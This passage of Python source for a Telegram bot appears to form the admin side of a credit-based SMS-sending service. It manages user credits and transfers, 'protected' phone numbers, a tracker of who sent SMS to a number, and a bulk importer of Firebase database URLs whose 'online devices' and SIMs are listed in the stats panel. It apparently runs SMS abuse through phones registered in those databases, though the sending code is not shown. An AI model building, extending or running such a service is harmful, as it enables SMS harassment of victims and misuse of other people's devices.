    await cq.answer("🛑 Stopping...", show_alert=True)
    try:
        async with s.lock:
            await cq.message.edit_text(
                f"{em(EMOJI_CROSS,'🛑')} <b>Stopping...</b>\n\n"
                f"✅ Sent: <b>{s.sent}</b>\n❌ Failed: <b>{s.failed}</b>",
                parse_mode="HTML")
    except: pass

# ===== VIDEO MANAGER =====
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO,'📹')} <b>Video Manager</b>\n\nTotal: <b>{len(d.get('videos',[]))}</b>",
        reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO,'📹')} <b>Add Video</b>\n\nSend video or file_id/URL:",
        reply_markup=kb((sc("cancel"), "owner:videos:menu")), parse_mode="HTML")

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear(); return
    fid = None
    if msg.video: fid = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        fid = msg.document.file_id
    elif msg.text: fid = msg.text.strip()
    if not fid:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid video needed.", parse_mode="HTML"); return
    d.setdefault("videos", []).append(fid); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK,'✅')} <b>Video Saved!</b>",
                     reply_markup=videos_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    idx = int(cq.data.split(":")[-1]); vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx); d["videos"] = vids; save(d); await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    d["videos"] = []; save(d); await cq.answer("🗑 All deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not d.get("videos"):
        await cq.answer("❌ No video available!", show_alert=True); return
    await cq.answer("📹 Sending...")
    await send_random_video(cq.bot, cq.message.chat.id,
        caption=f"{em(EMOJI_VIDEO,'📹')} Enjoy!")

# ===== NUMBER PROTECTION =====
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK,'🔒')} <b>Protect Number</b>\n\nEnter number:",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    n = msg.text.strip()
    if not n.replace("+","").replace(" ","").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid:", parse_mode="HTML"); return
    PROTECTED_NUMBERS[n] = msg.from_user.id
    d["protected_numbers"] = PROTECTED_NUMBERS; save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_LOCK,'🔒')} <b>Protected!</b>\n<code>{n}</code>",
                     reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")
    log_activity(d, "number_protected", msg.from_user.id, n)

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    prot = d.get("protected_numbers", {})
    if not prot:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK,'🔐')} <b>Protected Numbers</b>\n\n❌ <i>None.</i>",
            reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_LOCK,'🔐')} <b>Protected Numbers</b>\n"]
    show_full = is_owner(uid, d)
    for n, puid in prot.items():
        name = d.get("users", {}).get(str(puid), {}).get("name", "Unknown")
        disp = n if show_full else mask_number(n)
        lines.append(f"📞 <code>{disp}</code> — 🔒 <code>{puid}</code> ({name})")
    rows = []
    if show_full:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text("\n".join(lines),
                               reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
                               parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    prot = d.get("protected_numbers", {})
    if not prot:
        await cq.answer("❌ None protected!", show_alert=True); return
    rows = [[btn(n, f"owner:protected_del:{n}", EMOJI_CROSS, "🗑")] for n in prot]
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS,'🗑')} <b>Remove Protection</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    n = cq.data.split("owner:protected_del:", 1)[1]
    if n in d.get("protected_numbers", {}):
        del d["protected_numbers"][n]; save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed {n}", show_alert=True)
    else:
        await cq.answer("❌ Not found!", show_alert=True)
    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR,'📊')} <b>Track Number</b>\n\nEnter number:",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    n = msg.text.strip(); await state.clear()
    if not n.replace("+","").replace(" ","").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid:", parse_mode="HTML"); return
    hist = d.get("sms_history", {}); found = []
    for uid_str, lst in hist.items():
        for e in lst:
            if e.get("number") == n:
                ud = d.get("users", {}).get(uid_str, {})
                found.append({"uid": int(uid_str),
                              "name": ud.get("name","Unknown"),
                              "ts": e.get("timestamp",0)})
                break
    if not found:
        await msg.answer(f"{em(EMOJI_STAR,'📊')} <code>{n}</code>\n\n❌ No one sent to this number.",
                         reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML"); return
    lines = [f"{em(EMOJI_STAR,'📊')} <b>Tracker</b>\n📞 <code>{n}</code>\n"]
    for e in found:
        lines.append(f"• <code>{e['uid']}</code> — {e['name'][:20]} — {fmt_time(e['ts'])}")
    await msg.answer("\n".join(lines),
                     reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")

# ===== CREDITS BULK =====
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💰')} <b>Add Credits to ALL</b>\n\nHow many credits each?",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid positive number:", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} No users!", reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML"); return
    for u in users: add_credits(int(u), amt, d)
    save(d)
    notif = (f"{em(EMOJI_MONEY,'💰')} <b>Credits Added!</b>\n\n"
             f"{em(EMOJI_GIFT,'🎉')} +<b>{amt}</b> credits!\n"
             f"{em(EMOJI_MONEY,'💳')} Check balance in /start")
    sent = 0
    for u in users:
        try:
            await msg.bot.send_message(int(u), notif, parse_mode="HTML")
            sent += 1; await asyncio.sleep(0.05)
        except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Done!</b>\n💰 {amt} each\n👥 {len(users)} users\n📨 Notified: {sent}",
        reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")
    log_activity(d, "add_credits_all", msg.from_user.id, f"+{amt} to {len(users)}")

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💰')} <b>Deduct Credits from ALL</b>\n\nAmount per user?\n"
        f"<i>Owners/admins skipped. No notification.</i>",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid positive number:", parse_mode="HTML"); return
    await state.clear()
    owners = d.get("owners", []); admins = d.get("admins", [])
    count = total = 0
    for u_str, u in d.get("users", {}).items():
        if int(u_str) in owners or int(u_str) in admins: continue
        cur = u.get("credits", 0)
        if cur >= amt: u["credits"] = cur - amt; count += 1; total += amt
        elif cur > 0: total += cur; u["credits"] = 0; count += 1
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Deducted</b>\n💰 {amt} each\n👥 {count}\n💳 Total: {total}",
        reply_markup=kb((sc("back"), "owner:home")), parse_mode="HTML")
    log_activity(d, "deduct_credits_all", msg.from_user.id, f"-{total} from {count}")

# ===== USER CREDIT TRANSFER =====
@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if is_banned(uid, d) or not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True); return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await cq.answer("❌ Need at least 2 credits!", show_alert=True); return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY,'💸')} <b>Transfer Credits</b>\n\n"
        f"💰 Yours: <b>{cur}</b>\n⚠️ Max: half ({cur//2})\n\n"
        f"Target User ID:",
        reply_markup=kb((sc("cancel"), "user:home")), parse_mode="HTML")

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try: tgt = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid User ID:", parse_mode="HTML"); return
    if tgt == uid:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Can't transfer to yourself!", parse_mode="HTML"); return
    if str(tgt) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} User not found!", parse_mode="HTML"); return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Need at least 2 credits!", parse_mode="HTML"); return
    await state.update_data(transfer_target=tgt)
    await state.set_state(S.transfer_credits_amount)
    half = cur // 2
    await msg.answer(
        f"{em(EMOJI_MONEY,'💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR,'👤')} Target: <code>{tgt}</code>\n"
        f"{em(EMOJI_MONEY,'💰')} Yours: <b>{cur}</b>\n"
        f"{em(EMOJI_ROCKET,'📤')} Max (half): <b>{half}</b>\n\n"
        f"How many to transfer?",
        reply_markup=kb((sc("cancel"), "user:home")), parse_mode="HTML")

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid positive number:", parse_mode="HTML"); return
    data = await state.get_data()
    tgt = data.get("transfer_target")
    cur = get_user_credits(uid, d)
    max_t = cur // 2
    if amt > max_t:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Max {max_t} (half of {cur})!", parse_mode="HTML"); return
    if not deduct_credits(uid, amt, d):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Insufficient!", parse_mode="HTML"); return
    add_credits(tgt, amt, d); save(d); await state.clear()
    try:
        await msg.bot.send_message(tgt,
            f"{em(EMOJI_MONEY,'💸')} <b>Credits Received!</b>\n\n"
            f"👤 From: <code>{uid}</code>\n"
            f"💰 +{amt}\n💳 Balance: <b>{get_user_credits(tgt, d)}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Sent!</b>\n\n"
        f"👤 To: <code>{tgt}</code>\n"
        f"💰 {amt} credits\n💳 Yours: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML")
    log_activity(d, "credit_transfer", uid, f"{amt} to {tgt}")

# ===== OWNER / ADMIN HOME =====
@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

# ===== FIREBASE MANAGER =====
@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.clear()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE,'🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b>",
        reply_markup=fb_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE,'🔥')} <b>Add Firebase</b>\n\nFormat: <code>Label | URL</code>",
        reply_markup=kb((sc("cancel"), "owner:fb:menu")), parse_mode="HTML")

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1); label = parts[0].strip(); url = parts[1].strip()
    else:
        url = text; label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} URL must start with https://", parse_mode="HTML"); return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING,'⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs; save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>Firebase Added!</b>\n\n🏷 {label}\n🔗 <code>{url}</code>",
        reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE,'🔥')} <b>Bulk Add via TXT</b>\n\n"
        f"Upload a <code>.txt</code> file. Each line:\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicates auto-skip.</i>",
        reply_markup=kb((sc("cancel"), "owner:fb:menu")), parse_mode="HTML")

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Only .txt files!", parse_mode="HTML"); return
    file_info = await msg.bot.get_file(doc.file_id)
    content = (await msg.bot.download_file(file_info.file_path)).read().decode('utf-8', errors='ignore')
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    added = skipped = 0
    seen = set()
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if "|" in line:
            parts = line.split("|", 1); label = parts[0].strip(); url = parts[1].strip()
        else:
            url = line; label = url.replace("https://","").replace("http://","").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")): continue
        url = url.rstrip("/")
        if url in existing or url in seen:
            skipped += 1; continue
        seen.add(url); existing.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs; save(d); await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <b>TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE,'🔥')} Added: <b>{added}</b>\n"
        f"{em(EMOJI_WARNING,'⚠️')} Skipped: <b>{skipped}</b>\n"
        f"{em(EMOJI_STAR,'📊')} Total DBs: <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS,'❌')} Send a valid .txt file!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    fb_id = cq.data.split("owner:fb:del:", 1)[1]
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE,'🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d), parse_mode="HTML")

# ===== STATS =====
@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    cur_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur_ids]
    for k in [k for k in FB_DEVICE_COUNTS if k not in cur_ids]:
        FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices() or await get_all_online_devices(d)
    text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK,'🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING,'😴')} None")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE,'📱')} <b>{dv['dev_name'][:20]}</b>\n"
            f"     {em(EMOJI_FIRE,'🔥')} {dv['fb_label'][:25]}\n"
            f"     {em(EMOJI_STAR,'📶')} SIMs: {len(dv['sims']) or 1}")
    full = text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000: full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(full,
        reply_markup=kb((sc("refresh"), "owner:stats"), (sc("back"), "owner:home")),
        parse_mode="HTML")

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    cur_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur_ids]
    for k in [k for k in FB_DEVICE_COUNTS if k not in cur_ids]:
        FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices() or await get_all_online_devices(d)
    text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK,'🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING,'😴')} None")
    for dv in devices:
        dev_lines.append(f"  {em(EMOJI_PHONE,'📱')} <b>{dv['dev_name'][:20]}</b> — {em(EMOJI_FIRE,'🔥')} {dv['fb_label'][:20]}")
    full = text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000: full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(full,
        reply_markup=kb((sc("refresh"), "admin:stats"), (sc("back"), "admin:home")),
        parse_mode="HTML")

# ===== OWNERS / ADMINS MANAGEMENT =====
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN,'👑')} <b>Super Admins</b>\n\nTotal: <b>{len(d.get('owners', []))}/6</b>",
        reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True); return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN,'👑')} <b>Add Super Admin</b>\n\nChat ID:",
        reply_markup=kb((sc("cancel"), "owner:owners:menu")), parse_mode="HTML")

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING,'⚠️')} Already owner!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
    d["owners"].append(new_id); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK,'✅')} <b>Added!</b>\n<code>{new_id}</code>",
                     reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id,
            f"{em(EMOJI_CROWN,'🔱')} <b>You're now Super Admin!</b>\n/start",
            parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Can't remove main!", show_alert=True); return
    if del_id in d["owners"]:
        d["owners"].remove(del_id); save(d); await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN,'👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD,'🛡')} <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>",
        reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD,'🛡')} <b>Add Admin</b>\n\nUser ID:",
        reply_markup=kb((sc("cancel"), "owner:admins:menu")), parse_mode="HTML")

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: new_id = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Valid ID:", parse_mode="HTML"); return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING,'⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML"); return
    d["admins"].append(new_id); save(d); await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK,'✅')} <b>Added!</b>\n<code>{new_id}</code>",
                     reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(new_id,
            f"{em(EMOJI_SHIELD,'🛡')} <b>You're now Admin!</b>\n/start",
            parse_mode="HTML")
    except: pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id); save(d); await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD,'🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d), parse_mode="HTML")

# ===== FREE MODE TOGGLE =====
@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear(); d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on"); save(d); d = load()
    await cq.answer("✅ Done!", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

# ===== USERS LIST =====
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d):
